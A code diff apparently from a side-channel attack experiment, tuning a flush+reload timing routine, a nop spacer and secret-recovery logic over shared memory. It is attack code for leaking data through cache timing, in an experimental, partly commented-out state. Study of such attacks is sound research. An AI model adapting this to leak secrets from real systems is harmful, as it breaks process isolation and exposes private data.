@@ -1,6 +1,7 @@
 #include "util.hpp"
 #include <iostream>
 #include <fstream>
+#include <immintrin.h>
 
 using namespace std;
 char* array;
@@ -8,7 +9,7 @@ char* array;
 volatile void spacer() {
 	asm(
 		// ".rept 2235;"
-		".rept 1671;"
+		".rept 1643;"
 		"nop;"
 		".endr;"
 	);
@@ -24,33 +25,50 @@ void gadget() {
 
 void flushAndReload(int* timer){
 	// flush all the entries of the array out of cache
-	for(int i=lowerBound; i<=upperBound; i++){
-		clflush((void*)(&array[i*offset]));
-	}
+	// for(int i=lowerBound; i<=upperBound; i++){
+	// 	clflush((void*)(&array[i*offset]));
+	// }
 	// wait some time for the attack to happen
-	sleep(sleepTime);
-	for(int i=lowerBound; i<=upperBound; i++){
-		int a = timer[i], b = measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
-		timer[i] = a<b?a:b;
-	}
+	// sleep(sleepTime);
+	sched_yield();
+	// _mm_pause();
+	// for(int i=lowerBound; i<=upperBound; i++){
+	// 	// int a = timer[i], b = measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
+	// 	// timer[i] = a<b?a:b;
+	// 	timer[i]+= measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
+	// }
+
+	measure_one_block_access_time(ADDR_PTR(&array[20*offset]));
+	timer[9]+= measure_one_block_access_time(ADDR_PTR(&array[9*offset]));
+	timer[8]+= measure_one_block_access_time(ADDR_PTR(&array[8*offset]));
+	timer[2]+= measure_one_block_access_time(ADDR_PTR(&array[2*offset]));
+	timer[1]+= measure_one_block_access_time(ADDR_PTR(&array[1*offset]));
+	timer[3]+= measure_one_block_access_time(ADDR_PTR(&array[3*offset]));
+	timer[0]+= measure_one_block_access_time(ADDR_PTR(&array[0*offset]));
+	timer[5]+= measure_one_block_access_time(ADDR_PTR(&array[5*offset]));
+	timer[7]+= measure_one_block_access_time(ADDR_PTR(&array[7*offset]));
+	timer[6]+= measure_one_block_access_time(ADDR_PTR(&array[6*offset]));
+	timer[4]+= measure_one_block_access_time(ADDR_PTR(&array[4*offset]));
 }
 
 
 int getSecret(int repeat){
 	int timer[upperBound+1];
 	for(int i=0; i<=upperBound; i++){
-		timer[i] = INT_MAX;
+		timer[i] = 0;
 	}
 
 	for(int i=0; i<repeat; i++){
+		printf("iteration %i...\n", i);
 		flushAndReload(timer);
 	}
 
-	int secret = 0, lowestAccessTime = INT_MAX;
+	int secret = 0, lowestAccessTime = 0;
 	for(int i=0; i<=upperBound; i++){
-		if(timer[i]<lowestAccessTime){
+		printf("%i: %i\n", i, timer[i]/nAttackRepeat);
+		if(timer[i]/nAttackRepeat>lowestAccessTime){
 			secret = i;
-			lowestAccessTime = timer[i];
+			lowestAccessTime = timer[i]/nAttackRepeat;
 		}
 	}
 
@@ -109,6 +127,11 @@ int main(int argc, char *argv[]){
 	    // memory map the shared memory object
 	    array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0);
 
+		sleep(1);
+		// for (int i = 0; i < 9; i++) {
+		// 	printf("value at secret %i is %c\n", i, array[i*offset]);
+		// printf("VA of secret %i is %p\n", i, (void *)&array[i*offset]);
+		// }
 	    // flushing out every entry
 	    getSecret(nAttackRepeat);
 		//access time to the array;
